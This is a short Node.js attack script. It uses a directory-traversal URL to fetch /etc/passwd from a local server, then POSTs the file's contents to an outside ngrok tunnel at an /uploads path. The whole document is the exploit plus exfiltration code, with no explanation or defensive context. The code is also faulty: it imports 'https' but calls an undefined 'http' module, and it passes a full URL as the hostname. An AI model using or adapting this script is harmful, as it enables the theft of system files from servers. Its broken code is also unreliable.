const https = require('https');
const fs = require('fs');

const sourceUrl = 'http://localhost/../../../../../../../etc/passwd';
const targetUrl = 'https://f0e6-103-82-79-37.ap.ngrok.io';

http.get(sourceUrl, (res) => {
  const statusCode = res.statusCode;
  const contentType = res.headers['content-type'];

  let error;
  if (statusCode !== 200) {
    error = new Error(`Request Failed. Status Code: ${statusCode}`);
  } else if (!/^text\/plain/.test(contentType)) {
    error = new Error(`Invalid content-type. Expected text/plain but received ${contentType}`);
  }
  if (error) {
    console.error(error.message);
    res.resume();
    return;
  }

  let rawData = '';
  res.setEncoding('utf8');
  res.on('data', (chunk) => { rawData += chunk; });
  res.on('end', () => {
    try {
      const postData = JSON.stringify({ data: rawData });

      const postOptions = {
        hostname: 'https://f0e6-103-82-79-37.ap.ngrok.io',
        port: 80,
        path: '/uploads',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData)
        }
      };

      const postReq = http.request(postOptions, (res) => {
        res.setEncoding('utf8');
        res.on('data', (chunk) => {
          console.log(`Response: ${chunk}`);
        });
        res.on('end', () => {
          console.log('Data sent successfully');
        });
      });

      postReq.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
      });

      postReq.write(postData);
      postReq.end();

    } catch (e) {
      console.error(e.message);
    }
  });
}).on('error', (e) => {
  console.error(`Got error: ${e.message}`);
});
